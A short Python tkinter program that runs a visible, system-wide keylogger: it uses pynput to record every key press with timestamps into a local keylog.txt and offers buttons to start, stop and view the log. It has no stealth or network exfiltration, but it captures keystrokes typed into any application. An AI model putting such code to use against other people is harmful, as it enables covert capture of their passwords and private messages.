import tkinter as tk
import logging
from pynput import keyboard
from threading import Thread

# Configure logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x200")
        self.root.resizable(True, True)
        
        self.listener = None
        self.listener_thread = None
        
        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)
        
        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=10)
        self.stop_button.config(state=tk.DISABLED)
        
        self.view_button = tk.Button(root, text="View Keylog File", command=self.open_keylog)
        self.view_button.pack(pady=10)

    def on_key_press(self, key):
        try:
            logging.info('Key pressed: {0}'.format(key.char))
        except AttributeError:
            logging.info('Special key pressed: {0}'.format(key))

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener_thread = Thread(target=self.listener.start)
        self.listener_thread.start()
        
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
    
    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.listener_thread.join()
            self.listener = None
            self.listener_thread = None
        
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
    
    def open_keylog(self):
        try:
            with open('keylog.txt', 'r') as file:
                keylog_content = file.read()
            
            keylog_window = tk.Toplevel(self.root)
            keylog_window.title("Keylog File")
            keylog_window.geometry("600x400")
            keylog_window.resizable(True, True)
            
            text_area = tk.Text(keylog_window, wrap=tk.WORD)
            text_area.pack(expand=True, fill=tk.BOTH)
            text_area.insert(tk.END, keylog_content)
        except FileNotFoundError:
            error_window = tk.Toplevel(self.root)
            error_window.title("Error")
            tk.Label(error_window, text="Keylog file not found.").pack(pady=10)

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
